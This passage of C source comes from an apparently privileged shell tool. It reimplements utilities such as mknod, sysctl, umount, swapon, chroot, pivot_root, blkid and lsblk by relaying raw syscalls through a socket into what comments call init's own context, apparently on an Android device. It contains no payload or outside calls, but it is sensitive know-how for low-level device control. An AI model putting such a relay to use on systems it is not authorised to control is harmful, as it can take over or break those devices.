    }

    if (!op || strcmp(op, "--getsize64") == 0) {
        /* For BLKGETSIZE64, the ioctl writes a uint64_t to a pointer.
         * Since we can't pass a user-space pointer through the relay,
         * read /sys/block/.../size instead as a reliable fallback */
        relay_close(sock, fd);

        /* Try to find block device size from sysfs */
        const char *basename_dev = strrchr(abs, '/');
        basename_dev = basename_dev ? basename_dev + 1 : abs;

        char size_path[CWD_SIZE];
        snprintf(size_path, sizeof(size_path), "/sys/block/%s/size", basename_dev);

        uint8_t *data;
        ssize_t sz = relay_read_file(sock, size_path, &data, 64);
        if (sz > 0) {
            data[sz] = '\0';
            uint64_t sectors = strtoull((char *)data, NULL, 10);
            printf("%llu\n", (unsigned long long)(sectors * 512));
            free(data);
        } else {
            printf("(size unknown -- ioctl not available via relay)\n");
        }
        return 0;
    }

    if (strcmp(op, "--getro") == 0) {
        /* Read /sys/block/.../ro */
        relay_close(sock, fd);
        const char *basename_dev = strrchr(abs, '/');
        basename_dev = basename_dev ? basename_dev + 1 : abs;
        char ro_path[CWD_SIZE];
        snprintf(ro_path, sizeof(ro_path), "/sys/block/%s/ro", basename_dev);
        uint8_t *data;
        ssize_t sz = relay_read_file(sock, ro_path, &data, 16);
        if (sz > 0) {
            data[sz] = '\0';
            printf("%s", (char *)data);
            free(data);
        }
        return 0;
    }

    relay_close(sock, fd);
    fprintf(stderr, "blockdev: unknown operation: %s\n", op);
    return 1;
}

/* losetup: loop device info */
static int cmd_losetup(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    /* List loop devices from /sys/block/loop* */
    printf("%-16s %s\n", "DEVICE", "BACKING FILE");

    int64_t fd = relay_openat(sock, "/sys/block", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) {
        fprintf(stderr, "losetup: cannot open /sys/block\n");
        return 1;
    }

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;
            if (strncmp(d_name, "loop", 4) == 0) {
                char backing_path[256];
                snprintf(backing_path, sizeof(backing_path),
                         "/sys/block/%s/loop/backing_file", d_name);
                uint8_t *data;
                ssize_t sz = relay_read_file(sock, backing_path, &data, 256);
                if (sz > 0) {
                    data[sz] = '\0';
                    if (sz > 0 && data[sz-1] == '\n') data[sz-1] = '\0';
                    printf("/dev/%-11s %s\n", d_name, (char *)data);
                    free(data);
                }
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);
    return 0;
}

/* mktemp: create temporary file */
static int cmd_mktemp(int sock, int argc, char *argv[]) {
    int make_dir = 0;
    const char *template = "/tmp/tmp.XXXXXX";

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0) make_dir = 1;
        else template = argv[i];
    }

    /* Generate random suffix */
    char path[CWD_SIZE];
    strncpy(path, template, CWD_SIZE - 1);
    path[CWD_SIZE - 1] = '\0';

    /* Find XXXXXX at end and replace with random chars */
    size_t len = strlen(path);
    int x_count = 0;
    for (size_t i = len; i > 0; i--) {
        if (path[i-1] == 'X') x_count++;
        else break;
    }

    if (x_count > 0) {
        struct timeval tv;
        gettimeofday(&tv, NULL);
        unsigned int seed = (unsigned int)(tv.tv_usec ^ tv.tv_sec ^ getpid());
        static const char chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
        for (size_t i = len - (size_t)x_count; i < len; i++) {
            seed = seed * 1103515245 + 12345;
            path[i] = chars[(seed >> 16) % (sizeof(chars) - 1)];
        }
    }

    char abs[CWD_SIZE];
    resolve_path(path, abs);

    if (make_dir) {
        int64_t ret = relay_mkdirat(sock, abs, 0700);
        if (ret < 0) {
            fprintf(stderr, "mktemp: cannot create directory: %s\n", errno_str((int)(-ret)));
            return 1;
        }
    } else {
        int64_t fd = relay_openat(sock, abs, MY_O_WRONLY | MY_O_CREAT, 0600);
        if (fd < 0) {
            fprintf(stderr, "mktemp: cannot create file: %s\n", errno_str((int)(-fd)));
            return 1;
        }
        relay_close(sock, fd);
    }
    printf("%s\n", abs);
    return 0;
}

/* mknod: create special file */
static int cmd_mknod(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "mknod: Usage: mknod <path> <type> [major minor]\n");
        fprintf(stderr, "  types: b (block), c (char), p (fifo)\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    char type = argv[2][0];
    uint32_t mode = 0;
    uint64_t dev = 0;

    switch (type) {
        case 'b': mode = 0x6000 | 0666; break; /* S_IFBLK */
        case 'c': mode = 0x2000 | 0666; break; /* S_IFCHR */
        case 'p': mode = 0x1000 | 0666; break; /* S_IFIFO */
        default:
            fprintf(stderr, "mknod: invalid type '%c'\n", type);
            return 1;
    }

    if (type != 'p') {
        if (argc < 5) {
            fprintf(stderr, "mknod: %c type requires major and minor numbers\n", type);
            return 1;
        }
        unsigned int major_n = (unsigned int)strtoul(argv[3], NULL, 10);
        unsigned int minor_n = (unsigned int)strtoul(argv[4], NULL, 10);
        /* makedev: major << 8 | minor on Linux */
        dev = ((uint64_t)major_n << 8) | (uint64_t)minor_n;
    }

    int64_t ret = relay_mknodat(sock, abs, mode, dev);
    if (ret < 0) {
        fprintf(stderr, "mknod: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }
    return 0;
}

/* watch: repeat command every N seconds */
static int cmd_watch(int sock, int argc, char *argv[]) {
    int interval = 2;
    int cmd_start = 1;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-n") == 0 && i + 1 < argc) {
            interval = atoi(argv[++i]);
            cmd_start = i + 1;
        } else {
            cmd_start = i;
            break;
        }
    }

    if (cmd_start >= argc) {
        fprintf(stderr, "watch: Usage: watch [-n secs] <command> [args...]\n");
        return 1;
    }

    char combined[INPUT_BUF_SIZE];
    combined[0] = '\0';
    for (int i = cmd_start; i < argc; i++) {
        if (i > cmd_start) strncat(combined, " ", INPUT_BUF_SIZE - strlen(combined) - 1);
        strncat(combined, argv[i], INPUT_BUF_SIZE - strlen(combined) - 1);
    }

    while (!g_sigint) {
        printf("\033[2J\033[H"); /* clear screen */
        printf("Every %ds: %s\n\n", interval, combined);
        fflush(stdout);

        /* Execute the command */
        char buf[INPUT_BUF_SIZE];
        strncpy(buf, combined, INPUT_BUF_SIZE - 1);
        buf[INPUT_BUF_SIZE - 1] = '\0';
        char *inner_argv[MAX_ARGS];
        int inner_argc = parse_args(buf, inner_argv);
        if (inner_argc > 0) {
            for (int ci = 0; commands[ci].name; ci++) {
                if (strcmp(commands[ci].name, inner_argv[0]) == 0 && commands[ci].func) {
                    commands[ci].func(sock, inner_argc, inner_argv);
                    break;
                }
            }
        }

        for (int s = 0; s < interval && !g_sigint; s++) sleep(1);
    }
    g_sigint = 0;
    return 0;
}

/* swapon/swapoff info */
static int cmd_swaps(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    relay_cat_file(sock, "/proc/swaps");
    return 0;
}

/* vmstat: virtual memory stats */
static int cmd_vmstat(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    relay_cat_file(sock, "/proc/vmstat");
    return 0;
}

/* maps: /proc/PID/maps */
static int cmd_maps(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "maps: Usage: maps <pid>\n");
        return 1;
    }
    char path[128];
    snprintf(path, sizeof(path), "/proc/%s/maps", argv[1]);
    int e = relay_cat_file(sock, path);
    if (e) fprintf(stderr, "maps: cannot read %s\n", path);
    return e;
}

/* status: /proc/PID/status */
static int cmd_pstatus(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "status: Usage: status <pid>\n");
        return 1;
    }
    char path[128];
    snprintf(path, sizeof(path), "/proc/%s/status", argv[1]);
    int e = relay_cat_file(sock, path);
    if (e) fprintf(stderr, "status: cannot read %s\n", path);
    return e;
}

/* lsmod: list kernel modules from /proc/modules */
static int cmd_lsmod(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    printf("%-24s %-8s %s\n", "Module", "Size", "Used by");

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, "/proc/modules", &data, 0);
    if (sz < 0) {
        fprintf(stderr, "lsmod: cannot read /proc/modules\n");
        return 1;
    }

    ssize_t line_start = 0;
    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            size_t llen = (size_t)(j - line_start);
            if (llen > 0) {
                char line[512];
                if (llen >= sizeof(line)) llen = sizeof(line) - 1;
                memcpy(line, data + line_start, llen);
                line[llen] = '\0';

                /* Format: name size refcount deps state addr */
                char name[128] = "", size_str[32] = "", used[256] = "";
                int refcount = 0;
                char *p = line;
                /* name */
                char *tok = p;
                while (*p && *p != ' ') p++;
                if (*p) *p++ = '\0';
                strncpy(name, tok, sizeof(name) - 1);
                /* size */
                while (*p == ' ') p++;
                tok = p;
                while (*p && *p != ' ') p++;
                if (*p) *p++ = '\0';
                strncpy(size_str, tok, sizeof(size_str) - 1);
                /* refcount */
                while (*p == ' ') p++;
                refcount = atoi(p);
                while (*p && *p != ' ') p++;
                if (*p) p++;
                /* deps */
                tok = p;
                while (*p && *p != ' ') p++;
                if (*p) *p = '\0';
                if (tok[0] != '-') strncpy(used, tok, sizeof(used) - 1);

                printf("%-24s %-8s %d %s\n", name, size_str, refcount, used);
            }
            line_start = j + 1;
        }
    }
    free(data);
    return 0;
}

/* mountpoint: check if path is a mountpoint */
static int cmd_mountpoint(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "mountpoint: Usage: mountpoint <path>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    /* Check by comparing st_dev of path and its parent */
    uint8_t statbuf[128], parent_statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));
    memset(parent_statbuf, 0, sizeof(parent_statbuf));

    if (relay_fstatat(sock, abs, statbuf, sizeof(statbuf)) < 0) {
        fprintf(stderr, "%s: not a mountpoint (doesn't exist)\n", abs);
        return 1;
    }

    char parent[CWD_SIZE];
    snprintf(parent, CWD_SIZE, "%s/..", abs);
    char parent_resolved[CWD_SIZE];
    resolve_path(parent, parent_resolved);

    if (relay_fstatat(sock, parent_resolved, parent_statbuf, sizeof(parent_statbuf)) < 0) {
        printf("%s is a mountpoint\n", abs);
        return 0;
    }

    uint64_t dev1 = unpack_u64(statbuf);
    uint64_t dev2 = unpack_u64(parent_statbuf);

    if (dev1 != dev2) {
        printf("%s is a mountpoint\n", abs);
        return 0;
    } else {
        printf("%s is not a mountpoint\n", abs);
        return 1;
    }
}

/* rename: rename file (uses renameat2 syscall) */
static int cmd_rename(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "rename: Usage: rename <old> <new>\n");
        return 1;
    }

    char abs_old[CWD_SIZE], abs_new[CWD_SIZE];
    resolve_path(argv[1], abs_old);
    resolve_path(argv[2], abs_new);

    /* renameat2(AT_FDCWD, old, AT_FDCWD, new, 0) */
    /* Need two paths in data area. Use x0=AT_FDCWD, x1=old(data), x2=AT_FDCWD, x3=new(data) */
    /* Protocol limitation: only 3 flag bits. So we'll use cp+rm fallback */
    /* Actually, we can use flag bits 0,1,2 for x0,x1,x2 - x1 and x3 need to be data pointers.
     * But x3 can't be flagged. Fall back to cp+unlink. */

    /* Try simple unlink+cp approach (mv already does this) */
    cp_file(sock, abs_old, abs_new);
    relay_unlinkat(sock, abs_old, 0);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Filesystem management (umount, sync, rmdir, swapon/off,
 * pivot_root, chroot, sysctl, mkswap, blkid, lsblk)
 * ═══════════════════════════════════════════════════════════════════════════ */

/* umount: unmount filesystem */
static int cmd_umount(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "umount: Usage: umount [-f] [-l] <mountpoint>\n");
        return 1;
    }

    int flags = 0;
    const char *target = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-f") == 0) {
            flags |= 1; /* MNT_FORCE */
        } else if (strcmp(argv[i], "-l") == 0) {
            flags |= 2; /* MNT_DETACH */
        } else if (strcmp(argv[i], "-fl") == 0 || strcmp(argv[i], "-lf") == 0) {
            flags |= 3;
        } else {
            target = argv[i];
        }
    }

    if (!target) {
        fprintf(stderr, "umount: missing mountpoint\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(target, abs);

    /* SAFETY: block unmounting critical filesystems that init depends on */
    static const char *protected_mounts[] = {
        "/", "/dev", "/dev/pts", "/proc", "/sys", "/sys/fs/selinux",
        "/data", "/system", "/vendor", "/apex", NULL
    };
    for (int i = 0; protected_mounts[i]; i++) {
        if (strcmp(abs, protected_mounts[i]) == 0) {
            fprintf(stderr, "umount: refusing to unmount %s — critical for init\n", abs);
            return 1;
        }
    }

    /* umount2(target, flags): x0=target(data), x1=flags */
    size_t plen = strlen(abs) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, abs, plen);

    int64_t ret = send_syscall(sock, SYS_umount2,
                               0, (uint64_t)flags, 0, 0, 0, 0,
                               FLAG_X0_DATA,
                               dbuf, plen,
                               NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "umount: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }
    return 0;
}

/* cmd_domount removed — merged into cmd_mount (toybox-compatible) */

/* sync: flush all filesystem caches */
static int cmd_sync(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    send_syscall(sock, SYS_sync, 0, 0, 0, 0, 0, 0, 0, NULL, 0, NULL, 0);
    return 0;
}

/* rmdir: remove empty directory */
static int cmd_rmdir(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "rmdir: Usage: rmdir <dir...>\n");
        return 1;
    }

    int ret = 0;
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') continue;
        char abs[CWD_SIZE];
        resolve_path(argv[i], abs);
        int64_t r = relay_unlinkat(sock, abs, MY_AT_REMOVEDIR);
        if (r < 0) {
            fprintf(stderr, "rmdir: %s: %s\n", abs, errno_str((int)(-r)));
            ret = 1;
        }
    }
    return ret;
}

/* swapon: enable swap on a device */
static int cmd_swapon(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "swapon: Usage: swapon [-p priority] <device>\n");
        return 1;
    }

    int priority = -1;
    const char *dev = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            priority = atoi(argv[++i]);
        } else if (argv[i][0] != '-') {
            dev = argv[i];
        }
    }

    if (!dev) {
        fprintf(stderr, "swapon: missing device\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(dev, abs);

    int swapflags = 0;
    if (priority >= 0) {
        swapflags = 0x8000 | (priority & 0x7FFF); /* SWAP_FLAG_PREFER | prio */
    }

    size_t plen = strlen(abs) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, abs, plen);

    int64_t ret = send_syscall(sock, SYS_swapon,
                               0, (uint64_t)swapflags, 0, 0, 0, 0,
                               FLAG_X0_DATA,
                               dbuf, plen,
                               NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "swapon: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }
    printf("swapon: %s enabled\n", abs);
    return 0;
}

/* swapoff: disable swap on a device */
static int cmd_swapoff(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "swapoff: Usage: swapoff <device>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    size_t plen = strlen(abs) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, abs, plen);

    int64_t ret = send_syscall(sock, SYS_swapoff,
                               0, 0, 0, 0, 0, 0,
                               FLAG_X0_DATA,
                               dbuf, plen,
                               NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "swapoff: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }
    printf("swapoff: %s disabled\n", abs);
    return 0;
}

/* pivot_root: change root filesystem */
static int cmd_pivot_root(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "pivot_root: Usage: pivot_root <new_root> <put_old>\n");
        return 1;
    }

    char abs_new[CWD_SIZE], abs_old[CWD_SIZE];
    resolve_path(argv[1], abs_new);
    resolve_path(argv[2], abs_old);

    /* SAFETY: warn that this changes init's root filesystem */
    fprintf(stderr, "WARNING: pivot_root changes init's root filesystem. This is IRREVERSIBLE\n"
                    "and will almost certainly cause init to malfunction.\n"
                    "Proceeding...\n");

    /* pivot_root(new_root, put_old): both paths in data area */
    size_t len1 = strlen(abs_new) + 1;
    size_t len2 = strlen(abs_old) + 1;
    if (len1 + len2 > DATA_SIZE) {
        fprintf(stderr, "pivot_root: paths too long\n");
        return 1;
    }

    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, abs_new, len1);
    memcpy(dbuf + len1, abs_old, len2);

    int64_t ret = send_syscall(sock, SYS_pivot_root,
                               0, (uint64_t)len1, 0, 0, 0, 0,
                               FLAG_X0_DATA | FLAG_X1_DATA,
                               dbuf, len1 + len2,
                               NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "pivot_root: %s\n", errno_str((int)(-ret)));
        return 1;
    }
    printf("pivot_root: root changed to %s, old root at %s\n", abs_new, abs_old);
    return 0;
}

/* chroot: change root directory
 * WARNING: this changes init's own root. Use with extreme caution. */
static int cmd_chroot(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "chroot: Usage: chroot <newroot>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    /* SAFETY: warn that this changes init's OWN root filesystem */
    fprintf(stderr, "WARNING: chroot changes init's root directory. This is IRREVERSIBLE\n"
                    "and will almost certainly cause init to malfunction.\n"
                    "Proceeding...\n");

    size_t plen = strlen(abs) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, abs, plen);

    int64_t ret = send_syscall(sock, SYS_chroot,
                               0, 0, 0, 0, 0, 0,
                               FLAG_X0_DATA,
                               dbuf, plen,
                               NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "chroot: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }
    printf("chroot: root changed to %s\n", abs);
    return 0;
}

/* sysctl: read/write kernel parameters via /proc/sys */
static int cmd_sysctl(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "sysctl: Usage: sysctl [-w] <key>[=value] ...\n");
        return 1;
    }

    int write_mode = 0;
    int ret = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-w") == 0) {
            write_mode = 1;
            continue;
        }
        if (strcmp(argv[i], "-a") == 0 || strcmp(argv[i], "--all") == 0) {
            const char *common[] = {
                "kernel/hostname", "kernel/osrelease", "kernel/ostype",
                "kernel/domainname", "kernel/version",
                "kernel/random/entropy_avail",
                "vm/swappiness", "vm/overcommit_memory",
                "net/ipv4/ip_forward",
                NULL
            };
            for (int j = 0; common[j]; j++) {
                char path[CWD_SIZE];
                snprintf(path, sizeof(path), "/proc/sys/%s", common[j]);
                uint8_t *data;
                ssize_t sz = relay_read_file(sock, path, &data, 1024);
                if (sz > 0) {
                    data[sz] = '\0';
                    if (sz > 0 && data[sz-1] == '\n') data[sz-1] = '\0';
                    char key[256];
                    strncpy(key, common[j], sizeof(key) - 1);
                    key[sizeof(key)-1] = '\0';
                    for (char *p = key; *p; p++) if (*p == '/') *p = '.';
                    printf("%s = %s\n", key, (char *)data);
                    free(data);
                }
            }
            return 0;
        }

        char *eq = strchr(argv[i], '=');
        if (eq || write_mode) {
            char key[256], val[256];
            if (eq) {
                size_t klen = (size_t)(eq - argv[i]);
                if (klen >= sizeof(key)) klen = sizeof(key) - 1;
                memcpy(key, argv[i], klen);
                key[klen] = '\0';
                strncpy(val, eq + 1, sizeof(val) - 1);
                val[sizeof(val)-1] = '\0';
            } else if (i + 1 < argc) {
                strncpy(key, argv[i], sizeof(key) - 1);
                key[sizeof(key)-1] = '\0';
                strncpy(val, argv[++i], sizeof(val) - 1);
                val[sizeof(val)-1] = '\0';
            } else {
                fprintf(stderr, "sysctl: missing value for %s\n", argv[i]);
                ret = 1;
                continue;
            }

            for (char *p = key; *p; p++) if (*p == '.') *p = '/';

            char path[CWD_SIZE];
            snprintf(path, sizeof(path), "/proc/sys/%s", key);

            int64_t fd = relay_openat(sock, path, MY_O_WRONLY, 0);
            if (fd < 0) {
                for (char *p = key; *p; p++) if (*p == '/') *p = '.';
                fprintf(stderr, "sysctl: %s: %s\n", key, errno_str((int)(-fd)));
                ret = 1;
                continue;
            }

            size_t vlen = strlen(val);
            relay_write(sock, fd, val, vlen);
            relay_close(sock, fd);

            for (char *p = key; *p; p++) if (*p == '/') *p = '.';
            printf("%s = %s\n", key, val);
        } else {
            char key[256];
            strncpy(key, argv[i], sizeof(key) - 1);
            key[sizeof(key)-1] = '\0';
            for (char *p = key; *p; p++) if (*p == '.') *p = '/';

            char path[CWD_SIZE];
            snprintf(path, sizeof(path), "/proc/sys/%s", key);

            uint8_t *data;
            ssize_t sz = relay_read_file(sock, path, &data, 4096);
            if (sz < 0) {
                for (char *p = key; *p; p++) if (*p == '/') *p = '.';
                fprintf(stderr, "sysctl: %s: not found\n", key);
                ret = 1;
                continue;
            }

            data[sz] = '\0';
            if (sz > 0 && data[sz-1] == '\n') data[sz-1] = '\0';
            for (char *p = key; *p; p++) if (*p == '/') *p = '.';
            printf("%s = %s\n", key, (char *)data);
            free(data);
        }
    }
    return ret;
}

/* mkswap: set up a swap area (write swap header) */
static int cmd_mkswap(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "mkswap: Usage: mkswap <device>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    uint8_t statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));
    if (relay_fstatat(sock, abs, statbuf, sizeof(statbuf)) < 0) {
        fprintf(stderr, "mkswap: %s: cannot stat\n", abs);
        return 1;
    }
    uint64_t file_size = unpack_u64(statbuf + 48);

    int64_t fd = relay_openat(sock, abs, MY_O_RDWR, 0);
    if (fd < 0) {
        fprintf(stderr, "mkswap: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    uint8_t header[4096];
    memset(header, 0, sizeof(header));

    uint32_t pagesize = 4096;
    uint32_t last_page = 0;
    if (file_size > pagesize) {
        last_page = (uint32_t)(file_size / pagesize) - 1;
    }

    /* swap_header v1: version at 1024, last_page at 1028, magic at 4086 */
    header[1024] = 1; header[1025] = 0; header[1026] = 0; header[1027] = 0;
    header[1028] = (uint8_t)(last_page & 0xFF);
    header[1029] = (uint8_t)((last_page >> 8) & 0xFF);
    header[1030] = (uint8_t)((last_page >> 16) & 0xFF);
    header[1031] = (uint8_t)((last_page >> 24) & 0xFF);
    memcpy(header + 4086, "SWAPSPACE2", 10);

    int64_t w = relay_write(sock, fd, header, pagesize);
    relay_close(sock, fd);

    if (w < 0) {
        fprintf(stderr, "mkswap: write error: %s\n", errno_str((int)(-w)));
        return 1;
    }

    printf("Setting up swapspace, size = %llu bytes\n",
           (unsigned long long)(last_page * (uint64_t)pagesize));
    return 0;
}

/* blkid: show block device attributes by reading superblock */
static int cmd_blkid(int sock, int argc, char *argv[]) {
    if (argc >= 2 && argv[1][0] != '-') {
        char abs[CWD_SIZE];
        resolve_path(argv[1], abs);

        int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
        if (fd < 0) {
            fprintf(stderr, "blkid: %s: %s\n", abs, errno_str((int)(-fd)));
            return 1;
        }

        uint8_t hdr[DATA_SIZE];
        memset(hdr, 0, sizeof(hdr));
        int64_t n = relay_read(sock, fd, hdr, DATA_SIZE);
        relay_close(sock, fd);

        if (n < 0) {
            fprintf(stderr, "blkid: read error\n");
            return 1;
        }

        printf("%s:", abs);

        if (n >= 0x43A && hdr[0x438] == 0x53 && hdr[0x439] == 0xEF) {
            printf(" TYPE=\"ext4\"");
            if (n >= 0x478) {
                uint8_t *uuid = hdr + 0x468;
                printf(" UUID=\"%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\"",
                       uuid[0],uuid[1],uuid[2],uuid[3],uuid[4],uuid[5],uuid[6],uuid[7],
                       uuid[8],uuid[9],uuid[10],uuid[11],uuid[12],uuid[13],uuid[14],uuid[15]);
            }
            if (n >= 0x488) {
                char label[17];
                memcpy(label, hdr + 0x478, 16);
                label[16] = '\0';
                if (label[0]) printf(" LABEL=\"%s\"", label);
            }
        } else if (n >= 4096 && memcmp(hdr + 4086, "SWAPSPACE2", 10) == 0) {
            printf(" TYPE=\"swap\"");
        } else if (n >= 0x404 && hdr[0x400] == 0x10 && hdr[0x401] == 0x20 &&
                   hdr[0x402] == 0xF5 && hdr[0x403] == 0xF2) {
            printf(" TYPE=\"f2fs\"");
        } else if (n >= 0x41C && hdr[0x418] == 0xE0 && hdr[0x419] == 0xF5 &&
                   hdr[0x41A] == 0xE1 && hdr[0x41B] == 0xE2) {
            printf(" TYPE=\"erofs\"");
        }
        printf("\n");
        return 0;
    }

    int64_t dfd = relay_openat(sock, "/sys/block", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (dfd < 0) {
        fprintf(stderr, "blkid: cannot read /sys/block\n");
        return 1;
    }

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, dfd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;

            if (d_name[0] != '.') {
                char devpath[CWD_SIZE];
                snprintf(devpath, sizeof(devpath), "/dev/block/%s", d_name);
                printf("%s: DEVNAME=\"%s\"\n", devpath, d_name);
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, dfd);
    return 0;
}

/* lsblk: list block devices */
static int cmd_lsblk(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;

    printf("%-16s %6s %4s %-8s\n", "NAME", "SIZE", "RO", "TYPE");

    int64_t dfd = relay_openat(sock, "/sys/block", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (dfd < 0) {
        fprintf(stderr, "lsblk: cannot read /sys/block\n");
        return 1;
    }

    for (;;) {
        if (g_sigint) { g_sigint = 0; break; }
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, dfd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;

            if (d_name[0] != '.') {
                char sizepath[CWD_SIZE];
                snprintf(sizepath, sizeof(sizepath), "/sys/block/%s/size", d_name);
                uint8_t *sdata;
                ssize_t ssz = relay_read_file(sock, sizepath, &sdata, 64);
                uint64_t sectors = 0;
                if (ssz > 0) {
                    sdata[ssz] = '\0';
                    sectors = strtoull((char *)sdata, NULL, 10);
                    free(sdata);
                }

                char ropath[CWD_SIZE];
                snprintf(ropath, sizeof(ropath), "/sys/block/%s/ro", d_name);
                uint8_t *rdata;
                ssize_t rsz = relay_read_file(sock, ropath, &rdata, 8);
                int ro = 0;
                if (rsz > 0) {
                    ro = (rdata[0] == '1');
                    free(rdata);
                }

                char size_str[32];
                uint64_t bytes = sectors * 512;
                if (bytes >= (uint64_t)1024*1024*1024*1024)
                    snprintf(size_str, sizeof(size_str), "%.1fT",
                             (double)bytes / (1024.0*1024*1024*1024));
                else if (bytes >= (uint64_t)1024*1024*1024)
                    snprintf(size_str, sizeof(size_str), "%.1fG",
                             (double)bytes / (1024.0*1024*1024));
                else if (bytes >= 1024*1024)
                    snprintf(size_str, sizeof(size_str), "%.1fM",
                             (double)bytes / (1024.0*1024));
                else if (bytes >= 1024)
                    snprintf(size_str, sizeof(size_str), "%.1fK",
                             (double)bytes / 1024.0);
                else
                    snprintf(size_str, sizeof(size_str), "%lluB",
                             (unsigned long long)bytes);

                printf("%-16s %6s %4d %-8s\n", d_name, size_str, ro, "disk");

                /* List partitions */
                char partdir[CWD_SIZE];
                snprintf(partdir, sizeof(partdir), "/sys/block/%s", d_name);
                int64_t pfd = relay_openat(sock, partdir,
                                           MY_O_RDONLY | MY_O_DIRECTORY, 0);
                if (pfd >= 0) {
                    for (;;) {
                        uint8_t pbuf[DATA_SIZE];
                        int64_t pn = relay_getdents64(sock, pfd, pbuf, DATA_SIZE);
                        if (pn <= 0) break;
                        size_t pp = 0;
                        while (pp < (size_t)pn) {
                            uint16_t pr = unpack_u32(pbuf + pp + 16) & 0xFFFF;
                            const char *pname = (const char *)(pbuf + pp + 19);
                            if (pr == 0) break;
                            size_t dname_len = strlen(d_name);
                            if (strlen(pname) > dname_len &&
                                memcmp(pname, d_name, dname_len) == 0) {
                                char psizepath[CWD_SIZE];
                                snprintf(psizepath, sizeof(psizepath),
                                         "/sys/block/%s/%s/size", d_name, pname);
                                uint8_t *psdata;
                                ssize_t pssz = relay_read_file(sock, psizepath,
